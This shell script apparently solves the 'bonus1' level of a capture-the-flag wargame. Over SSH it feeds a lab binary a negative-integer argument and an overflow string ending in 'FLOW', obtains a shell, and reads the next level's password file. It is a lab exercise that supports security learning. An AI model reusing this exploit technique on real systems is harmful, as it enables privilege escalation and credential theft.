#!/usr/bin/env sh

### GLOBALS ###

CURR_DIR_PATH="$(cd "$(dirname "$0")" && pwd)"

### SOURCES ###

. "$CURR_DIR_PATH/../../common/ssh/ssh_session.sh";
. "$CURR_DIR_PATH/.sshid.sh";

# ##### #
# UTILS #
# ##### #

log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $*";
}

# #### #
# MAIN #
# #### #

main() {
    host="${host:-localhost}";
    port="${port:-4242}";
    username="${username:-bonus1}";
    password="${password}";
    flag="";

    arg1='-1073741813'
    arg2="$(printf '%b' 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\106\114\117\127')";

    log "Authenticating to SSH server at $host:$port with username '$username'...";
    ssh_initialize_socket "$host" "$port" "$username" "$password" || { log "Error: Failed to initialize SSH socket."; return 1; };
    ssh_exec_via_socket "$host" "$port" "$username" "rm -f /tmp/flag.txt && touch /tmp/flag.txt";
    (
        printf '%s' 'sleep 1;'; # Not viable but should workout.
        printf '%s' 'cat '/home/user/bonus2/.pass' > /tmp/flag.txt;';
    )| ssh_exec_via_socket "$host" "$port" "$username" "./bonus1 '$arg1' '$arg2'";
    flag=$(ssh_exec_via_socket "$host" "$port" "$username" "cat /tmp/flag.txt && rm -f /tmp/flag.txt");
    ssh_destroy_socket "$host" "$port" "$username" || { log "Error: Failed to destroy SSH socket."; return 1; };

    if [ -z "$flag" ]; then
        log "Error: flag is empty. Something went wrong.";
        return 1;
    fi

    flag_path="$CURR_DIR_PATH/../flag";
    echo -n "$flag" > "$flag_path";
    log "Flag '$flag' has been written to '$flag_path'";
}

main "$@";
